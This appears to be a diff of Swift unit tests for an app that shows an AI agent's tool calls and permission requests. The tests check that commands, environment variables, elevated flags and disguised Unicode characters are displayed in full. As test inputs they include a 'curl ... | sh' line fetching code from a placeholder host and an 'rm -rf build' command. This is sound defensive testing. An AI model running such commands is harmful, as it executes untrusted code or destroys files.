@@ -101,6 +101,42 @@ final class RemoteModelsTests: XCTestCase {
         XCTAssertEqual(ToolKind.summary([ToolCallItem(id: "q", name: "ask_user", isRunning: true)]), "Te hizo una pregunta")
     }
 
+    func testCommandsShowTheProgramAndEveryArgument() {
+        func command(_ json: String) -> String? {
+            ToolKind.command(in: try? JSONDecoder().decode(JSONValue.self, from: Data(json.utf8)))
+        }
+        XCTAssertEqual(command(#"{"command":"sh","args":["-c","x"]}"#), "sh -c x")
+        XCTAssertEqual(command(#"{"command":"sh","args":["-c","curl https://x.example/i | sh"]}"#), "sh -c 'curl https://x.example/i | sh'")
+        XCTAssertEqual(command(#"{"command":"echo","args":["it's",""]}"#), #"echo 'it'\''s' ''"#)
+        XCTAssertEqual(command(#"{"command":["git","commit","-m","fix bug"]}"#), "git commit -m 'fix bug'")
+        XCTAssertEqual(command(#"{"command":"swift test --filter X"}"#), "swift test --filter X")
+        let call = ToolCallItem(id: "c", name: "run_command",
+                                arguments: .object(["command": .string("sh"), "args": .array([.string("-c"), .string("rm -rf build")])]))
+        XCTAssertEqual(call.label, "sh -c 'rm -rf build'")
+    }
+
+    func testEveryArgumentAPermissionWouldUseIsVisible() {
+        let request = PendingRequest(requestID: "r", toolCallID: "c", toolName: "run_command", arguments: .object([
+            "command": .string("make"), "args": .array([.string("deploy")]), "cwd": .string("/w"),
+            "elevated": .bool(true), "env": .object(["TOKEN": .string("x")]), "timeout_ms": .number(3_000), "surprise": .string("y"),
+        ]), argumentsTruncated: false)
+        let summary = PermissionSummary(request)
+        XCTAssertEqual(summary.lines, ["make deploy"])
+        XCTAssertEqual(summary.detail, "En /w")
+        XCTAssertEqual(summary.extras.map { $0.components(separatedBy: ":")[0] }, ["elevated", "env", "surprise", "timeout_ms"])
+        XCTAssertTrue(summary.extras.contains("elevated: true"))
+        XCTAssertTrue(summary.extras.contains(#"env: {"TOKEN":"x"}"#))
+        let move = PendingRequest(requestID: "r", toolCallID: "c", toolName: "apply_patch", arguments: .object([
+            "patch": .string("*** Begin Patch\n*** Update File: a.swift\n*** Move to: b.swift\n*** End Patch"),
+        ]), argumentsTruncated: false)
+        XCTAssertEqual(PermissionSummary(move).lines, ["a.swift", "b.swift"])
+    }
+
+    func testNamesAPCChoosesLoseControlAndBidiCharacters() {
+        XCTAssertEqual("\u{202E}nix\u{200F}os\u{0007} ".displaySafe, "nixos")
+        XCTAssertEqual("Mac de Ana".displaySafe, "Mac de Ana")
+    }
+
     func testTaskListPutsPinnedFirstThenProjectsInTheirOrder() {
         let projects = [RemoteProject(id: "p1", name: "aurora", path: "/w/aurora"), RemoteProject(id: "p2", name: "rune", path: "/w/rune")]
         let tasks = [task("a", project: "p2"), task("b", project: "p1", pinned: true), task("c", project: "p1"),
@@ -146,7 +182,7 @@ final class RemoteModelsTests: XCTestCase {
         DebugUIFixtures.load("tasks", into: store)
         let saved = DebugUIFixtures.pairingPayload
         let impostor = PairingPayload(version: 2, routes: ["https://203.0.113.9:7787"], fingerprint: String(repeating: "e", count: 64),
-                                      serverID: saved.serverID, pairingID: saved.pairingID, secret: saved.secret,
+                                      serverID: DebugUIFixtures.serverID, pairingID: saved.pairingID, secret: saved.secret,
                                       expiresAt: saved.expiresAt, label: "nixos")
         do {
             try await store.pair(impostor, deviceName: "iPhone", requestID: UUID().uuidString)
